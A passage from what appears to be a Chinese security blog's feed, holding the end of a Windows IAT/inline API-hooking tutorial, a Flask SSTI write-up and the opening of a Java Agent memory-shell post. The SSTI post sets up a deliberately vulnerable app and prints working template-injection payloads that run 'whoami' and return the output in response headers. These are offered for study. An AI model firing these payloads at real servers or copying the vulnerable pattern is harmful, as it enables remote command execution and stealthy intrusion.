TRUE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">EvilMessageBox</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hwnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType)</span> &#123;</span><br><span class="line">    <span class="comment">//定义MyMessageBox的指针</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* PFNMESSAGEBOX)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取参数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Argument: hwnd-%x lpText-%ws lpCaption-%ws uType-%x\n\n&quot;</span>, hwnd, lpText, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行真正的函数</span></span><br><span class="line">    <span class="type">int</span> ret = ((PFNMESSAGEBOX)pOldFuncAddr)(hwnd, lpText, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取返回值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The return value is: %x\n\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">EvilIATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Before IAT HOOK&quot;</span>, <span class="string">L&quot;HOOK!&quot;</span>, MB_OK);</span><br><span class="line">    SetIATHook(pOldFuncAddr, (DWORD)EvilMessageBox);</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;IAT HOOK&quot;</span>, <span class="string">L&quot;IATHOOK Success!&quot;</span>, MB_OK);</span><br><span class="line">    UnSetIATHook(pOldFuncAddr, (DWORD)EvilMessageBox);</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;After IAT HOOK&quot;</span>, <span class="string">L&quot;HOOK!&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    EvilIATHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729070496355-269d7966-f520-441f-8060-e0f57a5eae74.png"></p><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><p><font style="color:#000000;">Inline Hook又被称为内联Hook，主要思想是直接修改目标API函数的代码</font></p><h4 id="实现方式-1"><a href="#实现方式-1" class="headerlink" title="实现方式"></a>实现方式</h4><ol><li><font style="color:#000000;">使用E9（JMP）进行InlineHook</font></li></ol><p><font style="color:#000000;">E9是JMP指令的操作码，用于进行近跳转。它后面跟随一个相对偏移，表示从当前指令后的下一个指令开始计算的跳转目标。</font></p><p><font style="color:#000000;">当使用E9进行InlineHook时，直接在目标函数的入口插入一个跳转指令，使其跳转到Hook函数。例如，E9 [offset]，其中[offset]是从JMP指令后的下一个指令到Hook函数的相对偏移（相对偏移 &#x3D; 目的地址 - 源地址 - 5）。其中，5是jmp指令的字节数。</font></p><ol start="2"><li><font style="color:#000000;">使用B8（MOV）和FF E0（JMP EAX）进行InlineHook</font></li></ol><p><font style="color:#000000;">B8是MOV指令的操作码，用于将一个立即数值移动到EAX寄存器。FF E0是JMP EAX指令的操作码，表示跳转到EAX寄存器中的地址。</font></p><p><font style="color:#000000;">当使用这种方法进行InlineHook时，首先将Hook函数的地址移动到EAX寄存器，然后使用JMP EAX跳转到该地址。例如，B8 [hook function address] FF E0，其中[hook function address]是Hook函数的绝对地址（即目标地址）。</font></p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_BYTES_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_BYTES_SIZE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Save some of the original code bytes of MessageBoxA</span></span><br><span class="line">BYTE OriginalBytes[ORIG_BYTES_SIZE]&#123;&#125;;</span><br><span class="line"><span class="comment">// Construct jump instruction</span></span><br><span class="line">BYTE PatchBytes[ORIG_BYTES_SIZE]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">using MessageBoxAT = <span class="type">int</span> (WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);</span><br><span class="line">MessageBoxAT OriginalMessageBox = nullptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">HookMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line"><span class="comment">// Execute custom code</span></span><br><span class="line">SIZE_T bytesOut = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;HookedMessageBox() called&quot;</span>, <span class="string">L&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// unpatch MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), (LPVOID)OriginalMessageBox, OriginalBytes, <span class="keyword">sizeof</span>(OriginalBytes), &amp;bytesOut);</span><br><span class="line"><span class="comment">// call MessageBoxA</span></span><br><span class="line"><span class="type">int</span> result = MessageBoxA(<span class="literal">NULL</span>, lpText, lpCaption, uType);</span><br><span class="line"><span class="comment">// patch MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), OriginalMessageBox, PatchBytes, <span class="keyword">sizeof</span>(PatchBytes), &amp;bytesOut);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">SetHook</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> dllName, <span class="built_in">std</span>::<span class="built_in">string</span> origFunc, FARPROC hookingFunc)</span> &#123;</span><br><span class="line">SIZE_T bytesIn = <span class="number">0</span>;</span><br><span class="line">SIZE_T bytesOut = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save MessageBoxA original address</span></span><br><span class="line">OriginalMessageBox = (MessageBoxAT)GetProcAddress(GetModuleHandleA(dllName.c_str()), origFunc.c_str());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save some of the original code bytes of MessageBoxA</span></span><br><span class="line">ReadProcessMemory(GetCurrentProcess(), OriginalMessageBox, OriginalBytes, ORIG_BYTES_SIZE, &amp;bytesIn);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(PatchBytes, <span class="number">0</span>, <span class="keyword">sizeof</span>(PatchBytes));</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN64)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">JMP [RIP+0];</span></span><br><span class="line"><span class="comment">\xFF\x25\x00\x00\x00\x00</span></span><br><span class="line"><span class="comment">\x00\x11\x22\x33\x44\0x55\x66\x77</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes, <span class="string">&quot;\xFF\x25&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">6</span>, &amp;hookingFunc, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mov eax, &amp;hookingFunc</span></span><br><span class="line"><span class="comment">jmp eax</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes, <span class="string">&quot;\xB8&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">1</span>, &amp;hookingFunc, <span class="keyword">sizeof</span>(ULONG_PTR));</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">5</span>, <span class="string">&quot;\xFF\xE0&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// patch the MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), OriginalMessageBox, PatchBytes, <span class="keyword">sizeof</span>(PatchBytes), &amp;bytesOut);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// Before Hook</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Before Hooking&quot;</span>, <span class="string">&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inline Hook</span></span><br><span class="line">SetHook(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>, (FARPROC)HookMessageBoxA);</span><br><span class="line"></span><br><span class="line"><span class="comment">// After Hook</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;After Hooking&quot;</span>, <span class="string">&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729425891866-f864fa9f-5b4c-4f0f-a394-148939d10064.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://pentest.blog/offensive-iat-hooking/">Offensive IAT Hooking</a></p><p><a href="https://mp.weixin.qq.com/s/wE56FotXCIPXj2OjdRmmSg">安全开发之应用层Hook技术</a></p>]]></content>
      
      
      <categories>
          
          <category> Antivirus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hook </tag>
            
            <tag> Antivirus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧用请求头回显SSTI命令执行结果</title>
      <link href="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/"/>
      <url>/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        args = request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">## 尝试渲染模板字符串</span></span><br><span class="line">            result = render_template_string(args)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment">## 如果渲染失败，打印错误信息并返回错误响应</span></span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error rendering template&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Please submit a POST request with &#x27;code&#x27; parameter.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注意到在Python搭建的Flask应用中，返回包中会存在Server相关的信息，而对于Werkzeug和Python的版本号肯定是通过某种处理方式写入了返回包的请求头中。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722114484-fbc92769-c629-4427-84b3-35ff374a113f.png"></p><p>编写一个Flask-Demo，在app.run处下断点看看运行的逻辑，开始部分都是环境相关的判断，接着判断是否开启Debug模式，处理Host和Port等信息。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722375653-b9174a21-93e9-415f-8877-43d0839886f4.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722441287-62b5f6d3-0aa2-4cbd-bd0f-8ff57d09c4de.png"></p><p>继续往下，会发现往options中添加了三个字段值，其中use_reloader和use_debugger的值是通过是否开启Debug模式来设置的，threaded则默认是TRUE。</p><p>接着，调用Werkzeug库启动一个WSGI服务器来运行Flask应用，并把Host、Port以及options等作为参数传入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">options.setdefault(<span class="string">&quot;use_reloader&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">options.setdefault(<span class="string">&quot;use_debugger&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">options.setdefault(<span class="string">&quot;threaded&quot;</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723000754-9dcb0079-e738-4c5c-8ea2-1b4bad171179.png"></p><p>跟进serving#run_simple函数中，依旧还是先进行一些环境、Debug模型的判断。接着调用make_server方法来创建一个WSGI服务器，并且默认是ThreadedWSGIServer。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723344882-e6d484bc-a8db-4b94-83e9-3d606f4d1af0.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723294877-580cee8e-f299-407c-915e-4aaeb2b11911.png"></p><p>此时已经知道了开启的Server类型，接着跟进Handler处理逻辑，在WSGIRequestHandler类中，在write方法中，通过for循环来将请求头键值对利用send_header方法进行设置。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724226859-76be49b4-294a-47ef-acef-89e6c67f65d2.png"></p><p>跟进send_header方法并下断点，可以看到第一次调用send_header方法的就是设置Server头，跟进调用栈send_response方法，可以看到对Server和Date头的设置。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724617102-407a59ca-b93d-426f-800c-da86f33534af.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724736111-dc4bac48-7038-409c-a4f4-55644da5264c.png"></p><p>跟进version_string方法，可以看到这里是将server_version属性和sys_version属性直接做的拼接。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724776918-6c430ebd-93fb-4e9c-acc9-bf6111bfc57b.png"></p><p>由于server_version和sys_version是以属性形式存在类中，那么就可以利用一些赋值方法来将代码或是命令执行的回显存放在这个属性中，从而结合send_header方法实现回显外带。</p><p>这里可以直接对父类BaseHTTPRequestHandler中的sys_version字段值进行修改即可。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.115:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">code=&#123;&#123;<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__<span class="selector-class">.setattr</span>(<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__<span class="selector-class">.sys</span><span class="selector-class">.modules</span><span class="selector-class">.http</span><span class="selector-class">.server</span><span class="selector-class">.BaseHTTPRequestHandler</span>,<span class="string">&quot;sys_version&quot;</span>,<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.read</span>())&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728725527229-0be52039-4fc4-47dd-9701-d99d70fe34ca.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728725517374-845c6378-30c9-4589-ba1f-9e65f889b3c1.png"></p><p>对于server_version的修改，可以修改WSGIRequestHandler类的server_version方法，该方法前存在装饰器@property，它把方法包装成属性，让方法可以以属性的形式被访问和调用，即此时server_version方法等同于self.server_version&#x3D;self.server._server_version。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.115:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">code=&#123;&#123;<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__<span class="selector-class">.setattr</span>(<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__<span class="selector-class">.sys</span><span class="selector-class">.modules</span><span class="selector-class">.werkzeug</span><span class="selector-class">.serving</span><span class="selector-class">.WSGIRequestHandler</span>,<span class="string">&quot;server_version&quot;</span>,<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.read</span>())&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728726062146-b81d7b6d-b0f2-4210-b05d-8bec63ae8680.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728726094317-83fd80fe-2fc6-49e1-8b6b-cc730442fb8f.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MemoryShell Of Agent</title>
      <link href="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java Agent是Java虚拟机提供的一种机制，允许在程序运行时动态地修改或增强Java应用程序的行为，通常使用Java Instrumentation API实现，可以在Java应用程序启动时通过命令行参数或其他方式加载。</p><p>将Java Agent与内存马结合使用，可以实现一种比传统的内存马更难以检测和防御的攻击方式。攻击者可以编写一个Java Agent程序，利用Java Instrumentation API动态地修改Java应用程序的字节码，将恶意代码插入到应用程序中，并在应用程序运行时执行恶意代码。由于恶意代码直接在内存中执行，不会在磁盘上留下痕迹，因此很难被传统的防御机制检测和防御。</p><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent简单来说就是JVM提供的一种动态Hook字节码的技术，通过Instrumentation（Java Agent API），开发者能够以一种无侵入的方式，在JVM加载某个class之前修改其字节码的内容，同时也支持重加载已经被加载过的class。</p><p>Java Agent目前有两种使用方式：</p><ul><li>通过-javaagent参数指定agent，从而在JVM启动之前修改class内容（自JDK 1.5开始）</li><li>通过VirtualMachine#attach方法，将agent附加在启动后的JVM进程中，进而动态修改class内容（自JDK 1.6开始）</li></ul><p>两种方式分别需要实现premain和agentmain方法，而这些方法又有如下四种签名，其中带有Instrumentation inst参数的方法优先级更高，会优先被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>;</span><br></pre></td></tr></table></figure><h3 id="启动时"><a href="#启动时" class="headerlink" title="启动时"></a>启动时</h3><h4 id="基础概述"><a href="#基础概述" class="headerlink" title="基础概述"></a>基础概述</h4><p>启动Java程序的时候，利用Java Agent需要添加-javaagent或-agentpath&#x2F;-agentlib（JVMTI的实现方式）参数，Java规定Java Agent程序必须要打包成jar格式并且需要利用MANIFEST.MF文件来配置Java Agent相关参数。同时，jar包中的MANIFEST.MF文件必须指定Premain-Class项，Premain-Class指定的那个类必须实现premain方法。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: com.example.AgentMemoryShell</span><br><span class="line">Premain-Class: com.example.AgentMemoryShell</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>premain方法会在执行main方法前调用，在运行main方法前会去加载-javaagent指定的jar包里面的Premain-Class类中的premain方法。</p><p>工作原理：使用addTransformer方法注册了一个自定义的Transformer类到Java 